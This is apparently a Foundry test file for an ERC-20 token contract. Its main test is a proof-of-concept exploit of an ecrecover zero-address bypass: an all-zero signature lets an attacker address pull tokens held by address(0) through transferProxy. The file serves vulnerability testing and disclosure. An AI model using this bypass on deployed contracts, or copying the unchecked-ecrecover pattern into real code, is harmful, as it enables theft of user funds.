pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {A12} from "src/ERC-20s/A12.sol";


contract A12Test is Test {
    A12 public token;
    address public attacker;
    address public victim;

    function setUp() public {
        token = new A12();
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        
        vm.deal(address(0), 1 ether);
        deal(address(token), address(0), 1000000 * 10**18);
        
        
        vm.prank(address(0));
        token.setTransferAllowed(address(0), true);
    }

    function test_VulnerabilityProof_ZeroAddressEcrecoverBypass() public {
        uint256 initialBalance = token.balanceOf(address(0));
        uint256 transferAmount = 1000 * 10**18;
        
        console.log("Initial balance of address(0):", initialBalance);
        console.log("Transfer amount:", transferAmount);
        
        
        uint8 v = 0;  
        bytes32 r = bytes32(0);  // Invalid r
        bytes32 s = bytes32(0);  
        
        
        // This should pass because ecrecover(invalidSig) = 0x0 and _from = 0x0
        vm.prank(attacker);
        bool success = token.transferProxy(
            address(0),  // _from = 0x0
            attacker,    
            transferAmount,
            0,           
            v, r, s      
        );
        
        assertTrue(success);
        assertEq(token.balanceOf(attacker), transferAmount);
        assertEq(token.balanceOf(address(0)), initialBalance - transferAmount);
        
        console.log("VULNERABILITY PROVEN: Attacker stole tokens from address(0)!");
        console.log("Attacker balance after exploit:", token.balanceOf(attacker));
        console.log("Address(0) balance after exploit:", token.balanceOf(address(0)));
    }

    function test_EcrecoverInvalidInputReturnZero() public pure {
        
        bytes32 hash = keccak256(abi.encodePacked("test"));
        address recovered = ecrecover(hash, 0, bytes32(0), bytes32(0));
        
        assertEq(recovered, address(0));
        console.log("Confirmed: ecrecover returns 0x0 with invalid parameters");
    }

    function test_ValidSignature() public {
        
        uint256 privateKey = 0x1234;
        address signer = vm.addr(privateKey);
        
        
        deal(address(token), signer, 1000000 * 10**18);
        vm.prank(signer);
        token.setTransferAllowed(signer, true);
        
        bytes32 hash = keccak256(abi.encodePacked(
            signer, 
            attacker, 
            uint256(1000 * 10**18), 
            uint256(0), 
            token.nonces(signer), 
            token.name()
        ));
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
        
        vm.prank(attacker);
        bool success = token.transferProxy(
            signer,
            attacker,
            1000 * 10**18,
            0,
            v, r, s
        );
        
        assertTrue(success);
        console.log("Valid signature works correctly");
    }
}